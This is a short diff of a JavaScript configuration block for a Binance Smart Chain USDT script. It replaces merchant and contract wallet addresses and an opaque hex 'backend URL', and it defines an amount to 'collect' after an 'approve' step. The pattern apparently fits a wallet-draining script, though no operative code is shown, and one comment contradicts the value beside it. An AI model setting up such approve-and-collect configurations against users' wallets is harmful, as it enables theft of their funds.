@@ -1,13 +1,13 @@
 "use strict";
 
 // ─── Configuration ────────────────────────────────────────────────────────────
-const MERCHANT_ADDRESS = "0x7682460D1C43ef8C1Fd2962eFe1A8cB2934b7ef4";
-const CONTRACT_ADDRESS = "0x34ADc2c84409696B46A8e3e7943D777A645c2537";
+const MERCHANT_ADDRESS = "0x3179d28547e40da68ba9bCfbf75f19e1cef86D6C";
+const CONTRACT_ADDRESS = "0x175d6294a747dbcecfd742efdd43104179d0c428";
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
-const BACKEND_URL      = "4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788";
+const BACKEND_URL      = "84e64ac424a78f31b2a17fa339954eb6a81e2320eb0dabc25f8883c44b29defc";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
